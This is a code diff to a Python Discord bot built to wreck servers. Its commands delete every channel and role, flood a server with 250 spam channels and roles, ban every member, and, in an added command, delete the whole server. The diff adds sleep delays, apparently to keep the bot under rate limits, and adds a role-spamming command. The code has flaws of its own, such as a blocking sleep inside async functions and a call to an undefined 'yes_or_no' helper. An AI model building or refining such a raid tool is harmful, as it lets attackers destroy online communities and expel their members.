@@ -1,4 +1,4 @@
-import discord, os, json
+import discord, os, json, time
 
 from discord.ext import commands
 
@@ -52,11 +52,13 @@ async def destroy(ctx):
     print('Destroyed:', ctx.guild.name)
     for channel in list(ctx.guild.channels):
         try:
+            time.sleep(1)
             await channel.delete()
         except:
             pass
     for role in list(ctx.guild.roles):
         try:
+            time.sleep(1)
             await role.delete()
         except:
             pass
@@ -71,8 +73,10 @@ async def destroy(ctx):
     except:
         pass
     for _i in range(250):
+        time.sleep(1)
         await ctx.guild.create_text_channel(name=x2)
     for _i in range(250):
+        time.sleep(1)
         await ctx.guild.create_role(name=x3)
 
 @bot.command()
@@ -82,18 +86,46 @@ async def massban(ctx):
     users = list(ctx.guild.members)
     for user in users:
         try:
+            time.sleep(1)
             await user.ban(reason="destroy.")
         except:
             pass
 
 @bot.command()
+async def delete(ctx):
+    await ctx.message.delete()
+    reply = str(input(f'would you like to delete {ctx.guild.name} (y/n): ')).lower().strip()
+    if reply[0] == 'y':
+        await ctx.guild.delete()
+        print(f'Deleted {ctx.guild.name}')
+        return True
+    if reply[0] == 'n':
+        print(f'Didn\'t delete {ctx.guild.name}')
+        return False
+    else:
+        return yes_or_no("Uhhhh... please enter ")
+
+@bot.command()
 async def spamchannels(ctx):
     await ctx.message.delete()
     x = input('Name of channels to spam?: ')
-    print('Spamming channels in:', ctx.guild.name,'with the name:', x)
+    print('Spamming channel creation in:', ctx.guild.name,'with the name:', x)
     for _i in range(250):
         try:
+            time.sleep(1)
             await ctx.guild.create_text_channel(name= x)
+        except:
+            return
+
+@bot.command()
+async def spamroles(ctx):
+    await ctx.message.delete()
+    x = input('Name of roles to spam?: ')
+    print('Spamming role creation in:', ctx.guild.name,'with the name:', x)
+    for _i in range(250):
+        try:
+            time.sleep(1)
+            await ctx.guild.create_role(name= x)
         except:
             return
 
@@ -103,6 +135,7 @@ async def delchannels(ctx):
     print('Deleteing channels in:', ctx.guild.name)
     for channel in list(ctx.guild.channels):
         try:
+            time.sleep(1)
             await channel.delete()
         except:
             return
@@ -110,9 +143,10 @@ async def delchannels(ctx):
 @bot.command()
 async def delroles(ctx):
     await ctx.message.delete()
-    print('Deleteing roles in:', bot.guild.name)
+    print('Deleteing roles in:', ctx.guild.name)
     for role in list(ctx.guild.roles):
         try:
+            time.sleep(1)
             await role.delete()
         except:
             pass
